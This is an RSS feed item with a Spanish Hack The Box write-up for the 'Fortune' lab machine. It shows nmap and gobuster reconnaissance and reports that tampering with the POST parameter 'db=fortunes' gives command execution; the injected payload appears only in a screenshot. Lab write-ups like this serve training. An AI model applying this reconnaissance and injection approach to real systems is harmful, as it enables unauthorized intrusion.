<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>openssl on sckull</title>
    <link>https://sckull.github.io/tags/openssl/</link>
    <description>Recent content in openssl on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 03 Aug 2019 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/openssl/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Fortune</title>
        <link>https://sckull.github.io/posts/fortune/</link>
        <pubDate>Sat, 03 Aug 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 03 Aug 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/fortune/</guid>
        <description>Fortune es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Fortune es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/178&#34;&gt;Fortune&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Other&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;50&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Insane&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.127&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/46317&#34;&gt;AuxSarge&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/46317&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[8.1, 7.7, 4.3, 5.7, 2.3],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[8, 9, 1, 9, 1],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Al realizar un escaneo con nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Wed Mar 13 22:48:02 2019 as: nmap -sV -sC -A -o nmap.scan 10.10.10.127&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.127
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp  open  http       OpenBSD httpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: OpenBSD httpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Fortune
443/tcp open  ssl/https?
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
No exact OS matches &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; host &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
TCP/IP fingerprint:
OS:SCAN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.70%E&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;3/13%OT&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;22%CT&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1%CU&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40048%PV&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DS&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;2%DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;T%G&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%TM&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5C89893
OS:B%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;SEQ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;SP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;102%GCD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1%ISR&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10D%TI&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;RD%CI&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;RI%TS&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;22&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;OPS&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;O
OS:1&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6NNT11%O2&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6NNT11%O3&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNW6NNT11%O4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6NNT11%
OS:O5&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6NNT11%O6&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNNT11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;WIN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;W1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W2&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W3&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W
OS:5&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W6&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;ECN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6%CC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y
OS:%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;O%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S+%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AS%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T2&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;T3&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;T4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S%F
OS:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S+%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T6&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y
OS:%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T7&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;U1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;FF%IPL&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;38%UN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%RI
OS:PL&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RID&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RUD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;IE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;https&#34;&gt;HTTPS&lt;/h1&gt;
&lt;p&gt;Al visitar la pagina nos encontramos con lo siguiente, por lo que no podemos hacer nada por ahora.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2016-51-49.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Con gobuster encontramos la siguiente ruta.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/fortune &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos firefox para ver las peticiones que hace cuando enviamos una solicitud a una de las opciones, en cada opcion si se hace una peticion este nos devuelve de manera aleatoria un mensaje.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-18%2015-20-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-18%2015-21-43.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y encontramos que, al editar las peticiones (&lt;code&gt;POST db=fortunes&lt;/code&gt;), encontramos que podemos ejecutar comandos (RCE):&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-18%2015-23-21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
